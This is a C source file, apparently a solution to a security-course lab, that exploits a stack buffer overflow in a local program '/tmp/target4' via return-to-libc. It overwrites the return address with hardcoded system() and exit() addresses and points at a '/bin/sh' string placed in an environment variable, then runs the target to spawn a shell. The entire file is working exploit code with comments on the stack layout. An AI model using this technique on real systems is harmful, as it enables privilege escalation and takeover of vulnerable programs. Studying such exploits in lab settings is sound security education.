#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

static char system_addr[] = "\xa0\x3d\xe4\xb7";
static char exit_addr[] = "\xd0\x79\xe3\xb7";
static char shell_addr[] = "\xe7\xff\xff\xbf";

int main(void)
{
  char *args[3]; 
  char *env[2];

  // set an environment variable
  int success = setenv("SHELLCODE", "/bin/sh", 0);
  char* env_ptr = getenv("SHELLCODE");
  printf("Shellcode environment variable address: %p; success: %d\n", getenv("SHELLCODE"), success);
  printf("Env ptr: 0x%x, %p\n", env_ptr, env_ptr);

  char buffer[20]; // target4 takes size of 4, plus 3 bytes of fluff will get us to the ebp and eip
  // EBP: Random
  // EIP: System
  // EIP + 4: Dummy return (Can be exit())
  // EIP + 8: Shell address
  memset(buffer, 0x90, 8); // overwrite EBP also with NOP
  memcpy(buffer+8, system_addr, 4); // system address goes in EIP
  // memset(buffer+12, 'A', 4); // dummy return address (Can this be exit()?)
  memcpy(buffer+12, exit_addr, 4); // Can this be exit()?
  memcpy(buffer+16, shell_addr, 4); // shell address

  args[0] = TARGET;
  args[1] = buffer; 
  args[2] = NULL;
  
  env[0] = env_ptr;
  env[1] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

